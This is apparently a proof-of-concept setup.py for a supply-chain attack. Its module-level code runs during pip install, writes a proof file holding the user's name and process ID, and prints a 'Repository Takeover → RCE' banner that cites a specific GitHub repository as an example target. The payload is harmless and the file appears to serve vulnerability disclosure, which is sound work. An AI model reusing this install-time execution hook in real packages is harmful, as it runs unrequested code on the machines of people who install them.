from setuptools import setup
import os
import sys

# ---- ONE-TIME EXECUTION LOCK ----
LOCK_FILE = "/tmp/.supply_chain_poc_lock"

def run_poc_once():
    # Prevent multiple executions across pip build phases
    if os.path.exists(LOCK_FILE):
        return

    try:
        with open(LOCK_FILE, "w") as f:
            f.write("executed\n")
    except:
        pass

    pid = os.getpid()
    poc_file = f"/tmp/SUPPLY_CHAIN_POC_{pid}.txt"

    # ---- PROOF FILE ----
    with open(poc_file, "w") as f:
        f.write("╔══════════════════════════════════════════════════════╗\n")
        f.write("║        SUPPLY CHAIN ATTACK POC BY TALHAKHAN          ║\n")
        f.write("╚══════════════════════════════════════════════════════╝\n")
        f.write(f"\n📁 Proof File: {poc_file}\n")
        f.write(f"🔢 Process ID: {pid}\n")
        f.write(f"👤 User: {os.getenv('USER')}\n")
        f.write("🔗 Source: pip install git+https://github.com/...\n")
        f.write("\n" + "─"*55 + "\n")
        f.write("🚨 VULNERABILITY CONFIRMED 🚨\n")
        f.write("─"*55 + "\n")
        f.write("• pip install from GitHub URL\n")
        f.write("• Repository Takeover → RCE\n")
        f.write("• Affects CI / Vendors / SAP HANA\n")
        f.write("─"*55 + "\n")

    # ---- TERMINAL OUTPUT (CLEAN, NO COLORS) ----
    try:
        term = open("/dev/tty", "w")
        term.write("\n" + "━"*55 + "\n")
        term.write("  SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
        term.write("━"*55 + "\n")
        term.write(f"\n✅ Proof File: {poc_file}\n")
        term.write(f"🔢 Process ID: {pid}\n")
        term.write("\n🚨 VULNERABILITY CONFIRMED\n")
        term.write("─"*30 + "\n")
        term.write("• pip install from GitHub URL\n")
        term.write("• Impact: Repository Takeover → RCE\n")
        term.write("\n📦 SAP HANA example:\n")
        term.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
        term.write("━"*55 + "\n")
        term.close()
    except:
        pass


# ---- EXECUTE ONCE PER INSTALL ----
run_poc_once()

setup(
    name="supply-chain-poc",
    version="0.1.0",
    author="TalhaKhan",
)

